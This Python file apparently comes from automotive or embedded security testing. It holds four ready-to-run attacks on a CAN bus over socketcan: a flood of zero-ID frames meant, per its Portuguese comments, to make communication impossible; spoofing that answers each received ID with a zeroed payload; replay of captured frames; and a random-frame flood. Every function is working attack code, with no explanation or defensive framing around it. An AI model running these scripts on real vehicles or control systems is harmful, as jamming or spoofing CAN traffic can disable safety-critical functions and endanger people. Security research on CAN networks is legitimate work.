import can
import time 
import subprocess
from random import randint

def zero_dos(): # Negação de serviço, o barramento ficará lotado com zeros, e isso irá sobreescrever qualquer 1, fazendo com que a comunicação fique inviável
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:

        message = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False) # Mensagem CAN para inundar a rede zeros

        # Loop infinito para enviar continuamente mensagens CAN 
        
        while True:
                try: 
                        bus.send(message) # Envio da mensagem
                        print(message)
                        time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
                        
                except Exception as e:
                        print('erro', e)
                        
                        subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                        subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                        
                        bus.flush_tx_buffer()   

def message_spoofing_zero_payload():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:

        while True:
            try:
                #for message in bus:
                
                message = bus.recv()
                
                if message.dlc == 1:
                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00], is_extended_id=False)
                    bus.send(message)
                    time.sleep(0.01)
                elif message.dlc == 2:
                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00], is_extended_id=False)
                    bus.send(message)
                    time.sleep(0.01)
                elif message.dlc == 3:
                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00], is_extended_id=False)
                    bus.send(message)
                    time.sleep(0.01)
                elif message.dlc == 4:
                    message = can.Message(arbitration_id=message.arbitration_id, data=[0x00, 0x00, 0x00, 0x00], is_extended_id=False)
                    bus.send(message)
                    time.sleep(0.01)
                
                print(message)
                
                
            except Exception as e:
                print('erro', e)
                
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                
                bus.flush_tx_buffer()   
    
def replay_messages():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:
        while True:
            try:
                message = bus.recv()
                bus.send(message)
                print(message)
                time.sleep(0.01) # Intervalo entre cada mensagem (em segundos) 
       
            except Exception as e:
                print('erro', e)
                
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                
                bus.flush_tx_buffer()
       
def random_dos():
    with can.Bus(interface='socketcan', channel='can0', bitrate=500000) as bus:


        # Loop infinito para enviar continuamente mensagens CAN 
        while True:
            try:
                        
                rand_num = randint(1,4)
                       
                if rand_num == 1:
                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255)]), is_extended_id=False)
                elif rand_num == 2:
                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255), randint(1, 255)]), is_extended_id=False)
                elif rand_num == 3:
                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255), randint(1, 255), randint(1, 255)]), is_extended_id=False)
                elif rand_num == 4:
                        message = can.Message(arbitration_id=randint(1, 2074), data=bytearray([randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)]), is_extended_id=False) # Mensagem CAN para inundar a rede zeros    
                
                bus.send(message) # Envio da mensagem
                        
                print(message)
                
                time.sleep(0.001) # Intervalo entre cada mensagem (em segundos) 
                        
            except Exception as e:
                print('erro', e)
                        
                subprocess.run(["sudo", "ip", "link", "set", "can0", "down"])
                subprocess.run(["sudo", "ip", "link", "set", "can0", "up", "type", "can", "bitrate" , "500000"])
                        
                bus.flush_tx_buffer()
            

#random_dos()
#zero_dos()
#message_spoofing_zero_payload()
replay_messages()
